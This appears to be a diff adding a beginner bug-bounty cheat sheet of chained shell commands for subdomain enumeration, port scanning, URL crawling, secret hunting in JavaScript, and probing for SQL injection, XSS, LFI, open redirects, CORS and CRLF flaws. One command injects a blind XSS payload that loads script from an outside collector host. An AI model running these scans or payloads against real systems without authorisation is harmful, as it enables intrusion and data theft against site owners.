@@ -1,0 +1,100 @@
+Bug Hunting methodology For Beginner
+-----------------------------------
+
+mkdir example
+cd example
+
+Tool-install-(https://github.com/projectdiscovery/subfinder)
+
+subfinder -d example.com -all  -recursive > subdomain1.txt
+
+cat subdomains.txt | wc -l
+
+Tool-install-(https://github.com/aungsanoo-usa/crt.sh)
+cd crt.sh
+./crt.sh  
+
+Tool-install -( sudo apt install -y jq )
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomain2.txt
+
+cat subdomain1.txt subdomain2.txt > subdomains.txt
+
+Tool-install-(https://github.com/projectdiscovery/naabu)
+naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
+
+
+Tool-install -( sudo apt install httpx-toolkit )
+cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+cat subdomains_alive.txt | wc -l 
+
+Tool-install-(https://github.com/projectdiscovery/katana)
+katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+
+
+cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+
+cat allurls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sed 's/=.*/=/' | sort | uniq > bsqli.txt
+
+
+Tool-install-(https://github.com/Emoe/kxss)(https://github.com/KathanP19/Gxss)
+
+cat allurls.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt
+
+
+Tool-install-(https://github.com/tomnomnom/gf)
+cat allurls.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt
+
+cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt
+
+
+Find vul..for blind sqli xss lfi or..ect...
+Tool-install-(https://github.com/coffinxp/loxs)
+cd loxs
+python3 loxs.py 
+chose each payloads and urls files
+
+cat allurls.txt | grep -E "\.js$" >> js.txt
+
+(https://github.com/m4ll0k/SecretFinder)
+cd SecretFinder
+python3 SecretFinder.py -i js.txt -o secret.txt
+sudo mv "/mnt/c/Users/Torikul Islam Lipon/Downloads/assets" .
+
+Tool-install-(https://github.com/projectdiscovery/nuclei)
+cat js.txt | nuclei -t /home/aung/nuclei-templates/http/exposures/ 
+
+echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /home/aung/nuclei-templates/http/exposures/ -c 30
+
+Tool-install- (sudo apt install dirsearch)
+dirsearch  -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+Tool-install-(go install github.com/repejota/qurl/cmd/qurl@develop - go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest- ) move qurl bxss to usr/local/bin
+
+subfinder -d example.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aunglat></script>' -parameters
+
+
+Tool-install-(https://github.com/PentestPad/subzy)
+subzy run --targets subdomains.txt --verify_ssl
+
+
+Tool-install-(https://github.com/s0md3v/Corsy)
+python3 corsy.py -i /home/aung/example/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+Tool-install-(https://github.com/aungsanoo-usa/priv8-Nuclei)
+nuclei -list subdomains_alive.txt -t /home/aung/Priv8-Nuclei/cors.yaml -v
+
+nuclei  -list ~/example/subdomains_alive.txt -tags cves,osint,tech
+
+cat allurls.txt | gf lfi | nuclei -tags lfi
+
+
+Tool-install-(https://github.com/devanshbatham/OpenRedireX)
+cat allurls.txt | gf redirect | openredirex -p /home/aung/openredirex/payloads.txt
+
+cat subdomains_alive.txt | nuclei -t /home/aung/Priv8-Nuclei/cRlf.yaml -v
+
+
+Tool-install-(go install github.com/bitquark/shortscan/cmd/shortscan@latest)
+shortscan https://example.com/ -F
+
